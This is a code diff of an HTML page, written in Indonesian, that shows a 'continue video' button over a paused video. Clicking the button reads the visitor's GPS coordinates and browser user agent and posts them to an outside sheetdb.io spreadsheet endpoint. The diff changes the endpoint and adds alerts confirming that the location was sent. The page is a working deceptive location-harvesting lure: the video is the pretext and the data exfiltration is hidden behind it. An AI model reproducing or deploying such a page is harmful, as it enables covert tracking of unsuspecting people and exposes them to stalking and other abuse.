@@ -13,7 +13,7 @@
 
 <div id="box" style="position:fixed; bottom:0; width:100%; background:black; color:white; text-align:center; padding:15px;">
   <p>Tekan untuk melanjutkan video</p>
-  <button onclick="lanjut()" style="padding:12px; font-size:16px; border:none; border-radius:5px;">
+  <button onclick="lanjut()" style="padding:12px; font-size:16px;">
     ▶ Lanjutkan Video
   </button>
 </div>
@@ -22,7 +22,6 @@
 let sudah = false;
 let v = document.getElementById("vid");
 
-// pause dulu biar tombol kepake
 v.pause();
 
 function lanjut() {
@@ -35,7 +34,7 @@ function lanjut() {
       let lat = pos.coords.latitude;
       let lon = pos.coords.longitude;
 
-      fetch("https://sheetdb.io/api/v1/av906p3tie5ax", {
+      fetch("https://sheetdb.io/api/v1/2ipys7fb7fh8h", {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
@@ -47,15 +46,24 @@ function lanjut() {
             device: navigator.userAgent
           }]
         })
+      })
+      .then(res => res.json())
+      .then(data => {
+        alert("✅ Lokasi berhasil dikirim");
+        console.log(data);
+      })
+      .catch(err => {
+        alert("❌ Gagal kirim ke Sheet");
+        console.log(err);
       });
 
+    },
+    err => {
+      alert("❌ Izin lokasi ditolak / error");
     }
   );
 
-  // lanjutkan video
   v.play();
-
-  // sembunyikan tombol
   document.getElementById("box").style.display = "none";
 }
 </script>
